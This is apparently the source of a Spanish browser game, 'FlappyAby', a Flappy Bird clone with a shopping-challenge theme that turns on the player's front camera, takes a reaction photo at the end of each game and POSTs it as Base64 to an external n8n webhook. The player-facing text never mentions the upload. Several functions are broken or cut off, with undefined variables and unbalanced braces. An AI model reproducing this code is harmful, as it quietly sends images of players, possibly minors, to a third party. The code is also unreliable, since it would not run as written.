<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=no" />
<title>FlappyAby</title>
<style>
:root{color-scheme:dark;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
*{box-sizing:border-box}
body{margin:0;min-height:100dvh;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle at 50% 16%,#ffd4ea,#f6a9ce 58%,#e888b6 100%);overflow:hidden}
.shell{position:relative;width:min(100vw,450px,calc(100dvh * .6));aspect-ratio:3/5;max-height:100dvh;overflow:hidden;border-radius:18px;box-shadow:0 25px 90px #0008;touch-action:none;user-select:none}
canvas{width:100%;height:100%;display:block;image-rendering:pixelated;background:#ffd8eb}
/* Marcador de puntuación. */
.hud{position:absolute;inset:0;pointer-events:none;z-index:2}
.score{position:absolute;top:14px;left:17px;font-size:38px;line-height:1;font-weight:1000;color:#fff;-webkit-text-stroke:1.5px #324e5d;filter:drop-shadow(0 3px 2px #0008)}
/* Música de fondo original: control manual, sin tapar los obstáculos. */
/* Ventanas: mismas tarjetas y colores que la tienda rosa pastel. */
.overlay{position:absolute;inset:0;background:#7f326f60;backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);display:flex;align-items:center;justify-content:center;padding:18px;transition:opacity .2s;z-index:4}
.overlay.hidden{opacity:0;pointer-events:none;visibility:hidden}
.panel{position:relative;isolation:isolate;overflow:hidden;text-align:center;width:100%;max-width:340px;padding:21px 20px 21px;border:3px solid #fff;border-radius:22px;background:linear-gradient(170deg,#fffaff 5%,#ffe2f1 55%,#ffd1e7 100%);box-shadow:0 0 0 4px #f393bf,0 8px 0 #bf5f96,0 18px 32px #7a3a686b;color:#893e70}
.panel::before{content:'';position:absolute;inset:0 0 auto;height:11px;background:repeating-linear-gradient(90deg,#ff79ad 0 14px,#ffd0e5 14px 28px);border-bottom:2px solid #fff7fc;z-index:-1}
.panel::after{content:'✦';position:absolute;top:29px;right:14px;color:#e969aa;font-size:20px;transform:rotate(-14deg);text-shadow:0 0 8px #fff}
.panel-kicker{display:inline-flex;align-items:center;justify-content:center;margin:12px 0 10px;padding:5px 13px;border:1.5px solid #f49ec9;border-radius:20px;background:#fff9fc;color:#bb4d87;font-weight:1000;font-size:10px;letter-spacing:.09em;box-shadow:0 2px 0 #efb1d1}
.emoji{display:flex;align-items:center;justify-content:center;margin:0 auto;width:68px;height:68px;border:3px solid #fff;border-radius:18px;background:linear-gradient(135deg,#ffe3f2,#ffafd5);box-shadow:0 4px 0 #e78cbb;transform:rotate(-4deg);font-size:39px;line-height:1}
.panel h1{margin:17px 0 9px;font-size:clamp(24px,6vw,31px);line-height:1.08;font-weight:1000;color:#c83c80;text-shadow:2px 2px #fff,0 3px #f4b0d0;letter-spacing:.005em}
.panel p{font-size:14px;line-height:1.45;margin:9px auto 15px;font-weight:700;max-width:288px;color:#873b70}
.panel-progress-caption{display:flex;align-items:center;justify-content:space-between;gap:6px;margin:3px 5px 7px;font-size:10px;font-weight:900;color:#ae4f83;letter-spacing:.035em}
.panel-progress-track{height:13px;overflow:hidden;padding:2px;background:#fff;border:2px solid #f49fcb;border-radius:7px;box-shadow:0 2px 0 #e3a0c5;margin:0 2px 17px}
.panel-progress-fill{height:100%;width:0%;border-radius:4px;background:repeating-linear-gradient(90deg,#fb70aa 0 12px,#ff9cc7 12px 24px);transition:width .22s ease-out}
.panel button{display:inline-flex;align-items:center;justify-content:center;gap:8px;width:min(100%,245px);min-height:48px;cursor:pointer;touch-action:manipulation;padding:10px 17px;border:2px solid #fff;border-radius:13px;background:linear-gradient(180deg,#ff90c5,#ec5a9b);box-shadow:0 5px 0 #ad3d78,0 9px 15px #b64c8633;color:#fff;font:1000 16px system-ui,-apple-system,sans-serif;text-shadow:0 2px 1px #ad417d;letter-spacing:.04em}
.panel button:active{transform:translateY(3px);box-shadow:0 2px 0 #ad3d78}
.panel button:disabled{opacity:.8;cursor:wait}
.panel button:focus-visible{outline:3px solid #bd3f88;outline-offset:5px}
.tip{margin:15px 0 0!important;font-size:11px!important;color:#a45b8b!important;line-height:1.35!important}
.panel[data-state="won"]{border-color:#fff3bc;background:linear-gradient(175deg,#fffafd 5%,#ffdbef 65%,#ffe6ad 100%);box-shadow:0 0 0 4px #f7b2d2,0 8px 0 #c58291,0 17px 32px #7a3a6866}
.panel[data-state="won"] .emoji{background:linear-gradient(#fff9cd,#ffbde0)}
.panel[data-state="won"] .panel-progress-fill{background:repeating-linear-gradient(90deg,#ffcc63 0 12px,#f89bc6 12px 24px)}
.panel[data-state="won"] .panel-kicker{color:#ae477c}
.panel[data-state="lost"] .emoji{background:linear-gradient(#ffe6f1,#ffb7d3)}
@media(prefers-reduced-motion:reduce){.panel-progress-fill{transition:none}}
.boost-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;pointer-events:none;z-index:3;opacity:0;overflow:hidden}
.boost-overlay.show{animation:boostFade .72s ease-out forwards}
.boost-bg{position:absolute;inset:0;background:radial-gradient(circle at center,#fff6f3a8 0%,#ffb8e58a 35%,#ef76b973 60%,#ec70a73d 76%,transparent 100%)}
.boost-rays,.boost-rays::before,.boost-rays::after{position:absolute;inset:-22%;content:'';background:repeating-conic-gradient(from 0deg,#ffffff00 0 10deg,#fffcffe5 10deg 13deg,#ffffff00 13deg 22deg);opacity:.34}
.boost-rays{animation:boostSpin .72s linear forwards}
.boost-rays::before{transform:scale(.78) rotate(14deg);opacity:.18}
.boost-rays::after{transform:scale(1.14) rotate(-9deg);opacity:.12}
.boost-card{position:relative;padding:23px 24px 21px;border-radius:22px;border:3px solid #fff7ff;background:linear-gradient(165deg,#fff9ff 0%,#ffe2f0 44%,#ffacd1 100%);box-shadow:0 0 0 5px #ec83b8,0 0 0 8px #fff2f8,0 12px 24px #9c467b70;transform:scale(.72);min-width:230px;text-align:center}
.boost-card::before{content:'✦  ✦  ✦';position:absolute;left:0;right:0;top:7px;font-size:11px;letter-spacing:20px;color:#e56fa8}
.boost-overlay.show .boost-card{animation:boostPop .72s cubic-bezier(.2,.9,.25,1) forwards}
.boost-kicker{margin-top:8px;font-size:11px;font-weight:1000;letter-spacing:.14em;color:#a3487e;text-transform:uppercase}
.boost-title{font-size:44px;line-height:1.02;font-weight:1000;color:#fa60a3;text-shadow:2px 2px #fff,0 4px 0 #f9b5d8;letter-spacing:.04em}
.boost-sub{margin-top:7px;font-size:16px;font-weight:1000;color:#a53d79}
.boost-level{display:inline-block;margin-top:9px;padding:5px 12px;border-radius:999px;background:#fff9fd;border:1.5px solid #f3a5cc;box-shadow:0 2px 0 #e79ebf;font-size:12px;font-weight:900;color:#b54886}
@keyframes boostFade{0%{opacity:0}12%{opacity:1}82%{opacity:1}100%{opacity:0}}
@keyframes boostSpin{0%{transform:scale(.7) rotate(0deg)}100%{transform:scale(1.15) rotate(70deg)}}
@keyframes boostPop{0%{transform:scale(.55)}20%{transform:scale(1.08)}34%{transform:scale(1)}72%{transform:scale(1)}100%{transform:scale(.94)}}
@media(max-width:500px){.shell{width:100vw;height:100dvh;max-height:none;aspect-ratio:auto;border-radius:0}.boost-card{min-width:210px;padding:21px 20px 18px}.boost-title{font-size:38px}.boost-sub{font-size:14px}.boost-kicker{font-size:11px}.boost-level{font-size:12px}}
@media(prefers-reduced-motion:reduce){.boost-overlay.show,.boost-rays,.boost-overlay.show .boost-card{animation:none}.boost-overlay.show{opacity:1}.boost-card{transform:scale(1)}}

/* Vista previa de cámara frontal, integrada con la interfaz rosa. */
.camera-box{position:absolute;left:11px;bottom:76px;width:105px;height:134px;z-index:2;overflow:hidden;border-radius:15px;border:3px solid #fff;background:linear-gradient(150deg,#ffeaf5,#f4b1d1);box-shadow:0 0 0 3px #e67bae,0 5px 13px #8847677c;pointer-events:none;isolation:isolate}
.camera-box::after{content:'';position:absolute;inset:0;border:1px solid #ffffff70;border-radius:11px;pointer-events:none}
.camera-video{width:100%;height:100%;display:block;object-fit:cover;transform:scaleX(-1);background:#f9d0e4}
.camera-box[data-active="true"] .camera-video{display:block}
.camera-label{position:absolute;top:5px;left:5px;padding:3px 7px;border-radius:8px;background:#d53d83d9;border:1px solid #fff8;font-size:9px;font-weight:1000;color:white;letter-spacing:.05em;text-shadow:0 1px #8c255d;z-index:1}
.camera-indicator{display:inline-block;width:5px;height:5px;vertical-align:middle;margin-right:3px;border-radius:50%;background:#ffe6f3}
.camera-box[data-active="true"] .camera-indicator{background:#89f4a9;box-shadow:0 0 5px #7dff9b}
.camera-placeholder{position:absolute;inset:0;background:linear-gradient(150deg,#ffeaf5,#f4b1d1);padding:33px 10px 8px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:7px;text-align:center;color:#99486f;font-size:10px;font-weight:800;line-height:1.25}
.camera-placeholder-icon{font-size:22px;line-height:1}
.camera-box[data-active="true"] .camera-placeholder{display:none}
/* Foto de reacción: visible en el resultado y enviada al webhook. */
.loss-photo-section[hidden]{display:none!important}
.loss-photo-section{margin:4px auto 13px;max-width:228px;padding:9px 10px 10px;border:2px solid #f4a1cb;border-radius:16px;background:#fff6fbdc;box-shadow:0 2px 0 #eeb2d2}
.loss-photo-heading{display:block;margin:0 0 6px;font-size:11px;font-weight:1000;color:#b64986;letter-spacing:.05em}
.loss-photo-img{display:block;max-width:100%;max-height:145px;object-fit:contain;margin:auto;border-radius:9px;border:2px solid #fff;box-shadow:0 0 0 2px #eba0ca;background:#eed9e6}
.loss-photo-img[hidden]{display:none!important}
.loss-photo-fallback{font-size:11px;font-weight:700;color:#985879;line-height:1.3}
.loss-photo-fallback[hidden]{display:none!important}
.camera-disclosure{font-size:10px!important;line-height:1.3!important;margin:0 auto 12px!important;color:#985d80!important}
.panel{max-height:calc(100dvh - 34px);overflow-y:auto;overscroll-behavior:contain}
@media(max-width:380px){.camera-box{left:8px;bottom:75px;width:91px;height:119px}.camera-placeholder{font-size:9px;padding:29px 6px 5px}}

/* Ventana final compacta: mensaje de premio y foto visibles en una captura. */
.panel[data-state="won"]{padding:11px 12px 13px}
.panel[data-state="won"] .panel-kicker{margin:7px 0 5px;padding:3px 10px;font-size:9px}
.panel[data-state="won"] .emoji{width:45px;height:45px;font-size:31px;box-shadow:0 2px 0 #e78cbb}
.panel[data-state="won"] h1{margin:9px 0 5px;font-size:26px}
.panel[data-state="won"] #message{margin:6px auto 9px;font-size:13px;line-height:1.28;font-weight:800;max-width:304px}
.panel[data-state="won"] .panel-progress-caption{margin:2px 3px 4px}
.panel[data-state="won"] .panel-progress-track{height:10px;margin-bottom:9px}
.panel[data-state="won"] .loss-photo-section{margin:3px auto 9px;padding:5px 8px 6px;max-width:210px}
.panel[data-state="won"] .loss-photo-heading{margin-bottom:4px;font-size:10px}
.panel[data-state="won"] .loss-photo-img{max-height:112px}
.panel[data-state="won"] button{min-height:43px}
.panel[data-state="won"] .tip{margin-top:7px!important;font-size:9px!important}

/* Inicio minimalista: solo el título, botón y consejos. El progreso se ve al terminar. */
#gamePanel[data-state="ready"] .panel-progress-caption,
#gamePanel[data-state="ready"] .panel-progress-track,
#gamePanel[data-state="starting"] .panel-progress-caption,
#gamePanel[data-state="starting"] .panel-progress-track{display:none}
#gamePanel .camera-disclosure{display:none}
#gamePanel[data-state="ready"] .camera-disclosure,
#gamePanel[data-state="starting"] .camera-disclosure{display:block}
</style>
</head>
<body>
<div class="shell" id="shell" aria-label="Juego FlappyAby">
<canvas id="game" width="360" height="600" aria-label="Pájaro volando entre obstáculos con dibujos de pijamas de Hello Kitty"></canvas>
<div class="hud">
  <span class="score" id="score">0</span>
  </div>
<div class="camera-box" id="cameraBox" data-active="false" aria-label="Vista previa de tu cámara frontal">
  <video class="camera-video" id="cameraVideo" autoplay muted playsinline disablepictureinpicture></video>
  <div class="camera-label"><span class="camera-indicator"></span>CAM</div>
  <div class="camera-placeholder"><span class="camera-placeholder-icon">📷</span><span id="cameraStatus">Vista previa</span></div>
</div>
<div class="boost-overlay" id="boostOverlay" aria-hidden="true">
  <div class="boost-bg"></div>
  <div class="boost-rays"></div>
  <div class="boost-card">
    <div class="boost-kicker">Incremento de velocidad</div>
    <div class="boost-title">BOOST</div>
    <div class="boost-sub" id="boostText">¡Más rápido!</div>
    <div class="boost-level" id="boostLevel">Nivel 2</div>
  </div>
</div>
<div class="overlay" id="overlay" role="dialog" aria-modal="true" aria-labelledby="headline">
  <div class="panel" id="gamePanel" data-state="ready">
    <div class="panel-kicker" id="panelKicker">♡ RETO DE COMPRAS ♡</div>
    <div class="emoji" id="emoji">🐤</div>
    <h1 id="headline">FlappyAby</h1>
    <p id="message" hidden></p>
    <div class="panel-progress-caption"><span>🛒 TU PROGRESO</span><span id="panelProgressText">0 / 100</span></div>
    <div class="panel-progress-track"><div class="panel-progress-fill" id="panelProgressFill"></div></div>
    <div class="loss-photo-section" id="lossPhotoSection" hidden>
      <span class="loss-photo-heading" id="photoHeading">📸 TU REACCIÓN</span>
      <img class="loss-photo-img" id="lossPhoto" alt="Fotografía de tu reacción al finalizar la partida" hidden />
      <div class="loss-photo-fallback" id="lossPhotoFallback" hidden>No fue posible tomar una foto. Comprueba el permiso de cámara.</div>
    </div>
    <button id="startButton">📷 ACTIVAR CÁMARA Y JUGAR</button>
    <p class="tip" id="panelTip">✦ Toca, haz clic o pulsa ESPACIO para aletear ✦</p>
  </div>
</div>
</div>
<script>
(()=>{
'use strict';
const canvas=document.getElementById('game'), ctx=canvas.getContext('2d');
const overlay=document.getElementById('overlay'), button=document.getElementById('startButton');
const headline=document.getElementById('headline'), message=document.getElementById('message'), emoji=document.getElementById('emoji'), scoreEl=document.getElementById('score');
const gamePanel=document.getElementById('gamePanel'), panelKicker=document.getElementById('panelKicker'), panelProgressText=document.getElementById('panelProgressText'), panelProgressFill=document.getElementById('panelProgressFill'), panelTip=document.getElementById('panelTip');
const boostOverlay=document.getElementById('boostOverlay'), boostText=document.getElementById('boostText'), boostLevel=document.getElementById('boostLevel');
const cameraVideo=document.getElementById('cameraVideo'), cameraBox=document.getElementById('cameraBox'), cameraStatus=document.getElementById('cameraStatus');
const lossPhotoSection=document.getElementById('lossPhotoSection'), lossPhoto=document.getElementById('lossPhoto'), lossPhotoFallback=document.getElementById('lossPhotoFallback');
const photoHeading=document.getElementById('photoHeading');
// CONFIGURACIÓN: cambia únicamente este número para ajustar el objetivo de cada partida.
// Meta de la versión completa: 100 obstáculos.
const OBSTACULOS_PARA_GANAR = 100;
// Tiempo de espera para la foto de reacción (segundos). Cambia solo este número.
const SEGUNDOS_FOTOREACCION = 2;
const REACTION_DELAY_MS = SEGUNDOS_FOTOREACCION * 1000;
// URL del webhook de n8n. Para producción, usar la URL /webhook/ correspondiente.
const URL_ENDPOINT_RESULTADOS = 'https://n8n.intelixlabs.com/webhook/juego/flappyaby';
const TIMEOUT_ENVIO_MS = 10000;
const W=360,H=600, FLOOR=H-67, PIPE_W=94, BIRD_X=92, RADIUS=13, TARGET=OBSTACULOS_PARA_GANAR;
// La meta visible usa el mismo parámetro (sin modificar velocidades ni mecánicas).
document.title=`FlappyAby — ${TARGET} obstáculos para ganar`;

 

let state='ready', birdY=H*.44, vy=0, pipes=[], score=0, frame=0, elapsed=0, last=0, shake=0;
// BOOST cada 10 puntos hasta el 70; desde ahí, cada 5: 75, 80, 85, 90 y 95.
// La velocidad aumenta con el MISMO incremento en cada BOOST, sin tope artificial.
// Solo termina de aumentar cuando acaba la partida (100 puntos).
const gravity=.36, jump=-6.25, BASE_SPEED=2.25;
const SPEED_STEP=10, BOOST_RAPIDO_DESDE=70, BOOST_RAPIDO_CADA=5;
const INCREMENTO_VELOCIDAD_POR_BOOST=(3.75-BASE_SPEED)/9;
function boostLevelForScore(passed){
 const p=Math.max(0,passed);
 const normales=Math.floor(Math.min(p,BOOST_RAPIDO_DESDE)/SPEED_STEP);
 const rapidos=Math.floor(Math.max(0,p-BOOST_RAPIDO_DESDE)/BOOST_RAPIDO_CADA);
 return normales+rapidos;
}
function speedForScore(passed){
 return BASE_SPEED+INCREMENTO_VELOCIDAD_POR_BOOST*boostLevelForScore(passed);
}
// Cada BOOST reduce 3 px el hueco; se conserva el mínimo solicitado de 148 px.
const GAP_INICIAL=175, GAP_MINIMO=148, REDUCCION_GAP_POR_BOOST=3;
function gapForScore(passed){
 return Math.max(GAP_MINIMO,GAP_INICIAL-boostLevelForScore(passed)*REDUCCION_GAP_POR_BOOST);
}
// Conserva una separación horizontal similar entre obstáculos, aunque aceleren.
const PIPE_SPACING=BASE_SPEED*106;
let speed=BASE_SPEED, scrollDistance=0, spawnedObstacles=0;
let soundCtx, boostTimer=0, lastBoostLevel=0;
// Volumen general más alto. Se pueden editar por separado sin cambiar la melodía.
const VOLUMEN_MUSICA = 3.0;
const VOLUMEN_EFECTOS = 1.9;
// Música original sintetizada: no requiere archivos ni conexión.
// Se toca solo durante la partida y no bloquea el resto del juego.
let musicGain=null, musicInterval=null, musicStep=0, nextMusicTime=0;
const MUSIC_TEMPO=120;
const MUSIC_STEP_SECONDS=60/MUSIC_TEMPO/2;
const MUSIC_MELODY=[72,76,79,null,76,74,72,null,74,76,79,81,79,76,74,null,72,74,76,79,76,72,69,null,71,72,74,76,72,69,67,null];
const MUSIC_BASS=[48,53,57,55];
function ensureAudio(){
 try{
  if(!soundCtx) soundCtx=new (window.AudioContext||window.webkitAudioContext)();
  if(soundCtx.state==='suspended')void soundCtx.resume().catch(()=>{});
  return soundCtx;
 }catch(e){return null;}
}
function chirp(freq=700,dur=.08,type='sine'){
 try{const audio=ensureAudio();if(!audio)return;let osc=audio.createOscillator(),gain=audio.createGain();osc.type=type;osc.frequency.setValueAtTime(freq,audio.currentTime);osc.frequency.exponentialRampToValueAtTime(Math.max(90,freq*.65),audio.currentTime+dur);gain.gain.setValueAtTime(.085*VOLUMEN_EFECTOS,audio.currentTime);gain.gain.exponentialRampToValueAtTime(.001,audio.currentTime+dur);osc.connect(gain).connect(audio.destination);osc.start();osc.stop(audio.currentTime+dur)}catch(e){}
}
function playMusicNote(note,time,duration,shape,volume){
 if(note===null || !soundCtx || !musicGain)return;
 const osc=soundCtx.createOscillator(),gain=soundCtx.createGain();
 osc.type=shape;
 osc.frequency.setValueAtTime(440*Math.pow(2,(note-69)/12),time);
 gain.gain.setValueAtTime(.0001,time);
 gain.gain.linearRampToValueAtTime(volume,time+.012);
 gain.gain.exponentialRampToValueAtTime(.0001,time+duration);
 osc.connect(gain).connect(musicGain);
 osc.start(time);
 osc.stop(time+duration+.018);
}
function musicTick(){
 if(state!=='playing'||!soundCtx||!musicGain)return;
 const horizon=soundCtx.currentTime+.30;
 while(nextMusicTime<horizon){
  const idx=musicStep%MUSIC_MELODY.length;
  playMusicNote(MUSIC_MELODY[idx],nextMusicTime,MUSIC_STEP_SECONDS*.84,'triangle',.028);
  if(idx%8===0){
   const bass=MUSIC_BASS[Math.floor(idx/8)%MUSIC_BASS.length];
   playMusicNote(bass,nextMusicTime,MUSIC_STEP_SECONDS*4.5,'sine',.021);
  }
  nextMusicTime+=MUSIC_STEP_SECONDS;
  musicStep++;
 }
}
function startMusic(){
 if(state!=='playing'||document.hidden||musicInterval!==null)return;
 const audio=ensureAudio();if(!audio)return;
 try{
  if(!musicGain){musicGain=audio.createGain();musicGain.gain.value=0;musicGain.connect(audio.destination);}
  musicGain.gain.cancelScheduledValues(audio.currentTime);
  musicGain.gain.setTargetAtTime(.65*VOLUMEN_MUSICA,audio.currentTime,.035);
  musicStep=0;nextMusicTime=audio.currentTime+.06;
  musicTick();
  musicInterval=setInterval(musicTick,90);
 }catch(e){stopMusic();}
}
function stopMusic(){
 if(musicInterval!==null){clearInterval(musicInterval);musicInterval=null;}
 if(soundCtx&&musicGain){
  musicGain.gain.cancelScheduledValues(soundCtx.currentTime);
  musicGain.gain.setTargetAtTime(0,soundCtx.currentTime,.02);
 }
}
// La cámara se activa únicamente al comenzar a jugar y tras el permiso del navegador.
// La foto se muestra en la pantalla de resultado y se envía al webhook del juego.
let cameraStream=null, cameraRequestId=0;
let cameraErrorMessage='';
function stopCamera(){
 cameraRequestId++;
 if(cameraStream){for(const track of cameraStream.getTracks())track.stop();cameraStream=null;}
 cameraVideo.pause();cameraVideo.srcObject=null;
 cameraBox.dataset.active='false';
}
function cameraIsReady(){
 return !!(cameraStream && cameraStream.getVideoTracks().some(t=>t.readyState==='live') &&
   !cameraVideo.paused && cameraVideo.readyState>=2 && cameraVideo.videoWidth>0 && cameraVideo.videoHeight>0);
}
function explainCameraError(err){
 const name=err?.name||'';
 if(!window.isSecureContext || !navigator.mediaDevices?.getUserMedia){
  return 'Chrome necesita una página HTTPS para activar la cámara. Abre el juego desde una dirección https://, no desde un archivo descargado ni desde una vista previa de otra aplicación.';
 }
 if(name==='NotAllowedError'||name==='PermissionDeniedError'||name==='SecurityError'){
  return 'Chrome bloqueó la cámara. En el candado o controles del sitio, permite Cámara y vuelve a intentarlo. Si abriste el juego dentro de WhatsApp u otra app, ábrelo directamente en Chrome.';
 }
 if(name==='NotFoundError'||name==='DevicesNotFoundError')return 'No se detectó una cámara disponible. Comprueba que tu teléfono tenga una cámara funcional.';
 if(name==='NotReadableError'||name==='TrackStartError')return 'La cámara está siendo utilizada por otra aplicación. Ciérrala y vuelve a intentarlo.';
 if(name==='OverconstrainedError')return 'Chrome no pudo configurar la cámara frontal. Prueba con una cámara disponible.';

function waitForVideoFrame(requestId,timeoutMs=9000){
 return new Promise((resolve,reject)=>{
  const start=performance.now();
  const check=()=>{
   if(requestId!==cameraRequestId || state!=='starting'){reject(new Error('Cámara cancelada'));return;}
   if(cameraIsReady()){resolve(true);return;}
   if(performance.now()-start>=timeoutMs){const error=new Error('Tiempo de espera de cámara agotado');error.name='TimeoutError';reject(error);return;}
   setTimeout(check,100);
  };
  check();
 });
}
async function startCamera(){
 cameraErrorMessage='';
 if(cameraIsReady())return true;
 if(!window.isSecureContext || !navigator.mediaDevices?.getUserMedia){
  cameraErrorMessage=explainCameraError();
  cameraStatus.textContent='Se requiere HTTPS';
  return false;
 }
 // Se conserva la transmisión entre intentos para no solicitar permiso de nuevo.
 let stream=cameraStream;
 if(stream && !stream.getVideoTracks().some(t=>t.readyState==='live')){
  stopCamera();stream=null;
 }
 const requestId=++cameraRequestId;
 cameraStatus.textContent=stream?'Reconectando vídeo…':'Solicitando permiso…';
 try{
  if(!stream){
   try{
    stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:{ideal:'user'},width:{ideal:480},height:{ideal:640}}});
   }catch(firstError){
    // Algunos teléfonos no aceptan las restricciones preferidas; probar cámara predeterminada.
    if(['NotFoundError','OverconstrainedError'].includes(firstError?.name)){
     stream=await navigator.mediaDevices.getUserMedia({audio:false,video:true});
    }else throw firstError;
   }
  }
  if(requestId!==cameraRequestId||state!=='starting'){
   if(stream!==cameraStream)stream.getTracks().forEach(t=>t.stop());
   return false;
  }
  cameraStream=stream;
  cameraVideo.muted=true;
  cameraVideo.defaultMuted=true;
  cameraVideo.playsInline=true;
  cameraVideo.autoplay=true;
  if(cameraVideo.srcObject!==stream)cameraVideo.srcObject=stream;
  // ¡No bloquearse esperando play()! En algunos Android puede quedar pendiente
  // hasta que el elemento de vídeo produzca su primer fotograma.
  try{const promise=cameraVideo.play();if(promise?.catch)promise.catch(()=>{});}catch(err){}
  cameraStatus.textContent='Esperando imagen…';
  await waitForVideoFrame(requestId);
  if(requestId!==cameraRequestId||state!=='starting')return false;
  cameraBox.dataset.active='true';
  cameraStatus.textContent='Cámara activa';
  stream.getVideoTracks()[0]?.addEventListener('ended',()=>{
   if(cameraStream===stream){
    stopCamera();cameraStatus.textContent='Cámara desconectada';
    if(state==='playing'){
     state='ready';stopMusic();boostOverlay.classList.remove('show');
     panel('CÁMARA DESCONECTADA','Vuelve a activar la cámara para continuar jugando.','📷','ACTIVAR CÁMARA');
    }
   }
  },{once:true});
  return true;
 }catch(err){
  if(requestId!==cameraRequestId)return false;
  console.warn('Error de cámara:',err);
  cameraErrorMessage=explainCameraError(err);
  stopCamera();
  cameraStatus.textContent='No se pudo activar';
  return false;
 }
}

function captureResultPhoto(){

 if(!canCapture){lossPhoto.hidden=true;lossPhotoFallback.hidden=false;return null;}
 try{
  const snap=document.createElement('canvas');
  snap.width=Math.min(400,cameraVideo.videoWidth);
  snap.height=Math.max(1,Math.round(snap.width*cameraVideo.videoHeight/cameraVideo.videoWidth));
  const snapCtx=snap.getContext('2d');
  // Espejo horizontal, igual que la vista previa de selfie.
  snapCtx.translate(snap.width,0);snapCtx.scale(-1,1);

  lossPhoto.src=foto;
  lossPhoto.hidden=false;lossPhotoFallback.hidden=true;
  return foto;
 }catch(err){lossPhoto.hidden=true;lossPhotoFallback.hidden=false;return null;}

// Envía el resultado como JSON. La imagen JPEG se envía directamente en Base64
// (sin prefijo data:image/jpeg;base64,) dentro de la propiedad "foto".
// Si el webhook falla, el juego sigue funcionando con normalidad.
async function enviarResultadoAlEndpoint({foto,puntos,status}){
 const controller=new AbortController();
 const timeout=setTimeout(()=>controller.abort(),TIMEOUT_ENVIO_MS);
 try{
  const fotoBase64=typeof foto==='string'
   ? foto.replace(/^data:image\/[a-zA-Z0-9.+-]+;base64,/, '')
   : '';
  const payload={foto:fotoBase64,puntos,status};
  const respuesta=await fetch(URL_ENDPOINT_RESULTADOS,{
   method:'POST',
   headers:{'Content-Type':'application/json'},
   body:JSON.stringify(payload),
   signal:controller.signal
  });
  if(!respuesta.ok)throw new Error(`HTTP ${respuesta.status}`);
 }catch(error){
  // No permitir que errores de red, CORS, timeout o servidor interrumpan la partida.
  console.warn('No fue posible enviar el resultado al webhook:',error);
 }finally{
  clearTimeout(timeout);
 }
}

// Vibración progresiva desde los 60 puntos: aumenta con cada BOOST real.
// BOOST normales en 60 y 70; luego cada 5 puntos (75, 80, 85, 90 y 95).
// Sin vibración antes de los 60. Si el teléfono no admite vibración, no interrumpe el juego.
const PUNTOS_INICIO_VIBRACION = 60;
const DURACION_VIBRACION_INICIAL_MS = 45;
const AUMENTO_VIBRACION_POR_BOOST_MS = 15;
function duracionVibracionParaPuntos(puntos){
 if(puntos<PUNTOS_INICIO_VIBRACION)return 0;
 const boostsDesde60=boostLevelForScore(puntos)-boostLevelForScore(PUNTOS_INICIO_VIBRACION);
 return DURACION_VIBRACION_INICIAL_MS + boostsDesde60*AUMENTO_VIBRACION_POR_BOOST_MS;
}

 }

function finalizarPartida(status){

 },REACTION_DELAY_MS);

function spawn(){let gap=gapForScore(score);let top=90+Math.random()*(FLOOR-gap-175);pipes.push({x:W+20,top,gap,passed:false,index:spawnedObstacles++})}
// La colisión usa el contorno circular del pájaro contra AMBAS piezas de cada pijama.
// Se verifica antes de sumar puntos, en subpasos para que no se salten impactos.
function birdHitsRect(rx,ry,rw,rh){
 if(rw<=0||rh<=0)return false;
 const nearestX=Math.max(rx,Math.min(BIRD_X,rx+rw));
 const nearestY=Math.max(ry,Math.min(birdY,ry+rh));
 const dx=BIRD_X-nearestX,dy=birdY-nearestY;
 return dx*dx+dy*dy<=RADIUS*RADIUS;
}
function hitsObstacleOrGround(){
 if(birdY-RADIUS<=0||birdY+RADIUS>=FLOOR)return true;
 for(const p of pipes){
  if(birdHitsRect(p.x,0,PIPE_W,p.top) ||
     birdHitsRect(p.x,p.top+p.gap,PIPE_W,FLOOR-p.top-p.gap)) return true;
 }
 return false;
}
function update(dt){
 if(state!=='playing')return;
 const steps=Math.min(dt,2.5);
 // Medio fotograma máximo por subpaso: detecta colisiones al instante,
 // incluso si el navegador tarda en entregar un frame.
 const count=Math.max(1,Math.ceil(steps*2));
 const step=steps/count;
 for(let i=0;i<count;i++){
  frame+=step;
  elapsed+=step;
  vy=Math.min(9,vy+gravity*step);
  birdY+=vy*step;
  const advance=speed*step;
  scrollDistance+=advance;
  // La distancia entre pijamas permanece consistente al acelerar.
  const spawnInterval=PIPE_SPACING/speed;
  if(elapsed>=spawnInterval){elapsed-=spawnInterval;spawn()}
  for(const p of pipes)p.x-=advance;
  // Colisiones ANTES del conteo: no se puede atravesar algo y ganar puntos.
  if(hitsObstacleOrGround()){
   birdY=Math.max(RADIUS,Math.min(FLOOR-RADIUS,birdY));
   finalizarPartida('perdido');
   return;
  }
  for(const p of pipes){
   if(!p.passed&&p.x+PIPE_W<BIRD_X-RADIUS){
    p.passed=true;
    score++;
    scoreEl.textContent=score;
    // BOOST cada 10 puntos hasta 70; luego cada 5 (75, 80, 85, 90 y 95).
    speed=speedForScore(score);
    const boostLevelNow=boostLevelForScore(score);
    if(score>0 && score<TARGET && boostLevelNow>lastBoostLevel){
      lastBoostLevel=boostLevelNow;
      triggerBoost(boostLevelNow);
    }
    chirp(960,.075);
    // El último obstáculo tiene índice TARGET-1 (índices desde 0):
    // tras superarlo, la partida termina inmediatamente con victoria.
    if(p.index===TARGET-1 || score>=TARGET){finalizarPartida('ganado');return}
   }
  }
  pipes=pipes.filter(p=>p.x+PIPE_W>-20);
 }
}

function pajamaPipe(x,y,h,down){
  if(h<=0)return;
  x=Math.round(x);y=Math.round(y);h=Math.round(h);
  const waistH=21,cuffH=21,tileY=70,tileH=72;
  ctx.save();
  ctx.beginPath();ctx.rect(x,y,PIPE_W,h);ctx.clip();
  // Silueta sólida de las dos piernas antes de que termine de cargar la imagen.
  ctx.fillStyle='#faf0f7';ctx.fillRect(x,y,PIPE_W/2,h);
  ctx.fillStyle='#f48fbc';ctx.fillRect(x+PIPE_W/2,y,PIPE_W/2,h);
  ctx.fillStyle='#42303f';ctx.fillRect(x+PIPE_W/2-1,y,2,h);
  if(pajamaSprite.complete&&pajamaSprite.naturalWidth){
    ctx.imageSmoothingEnabled=false;
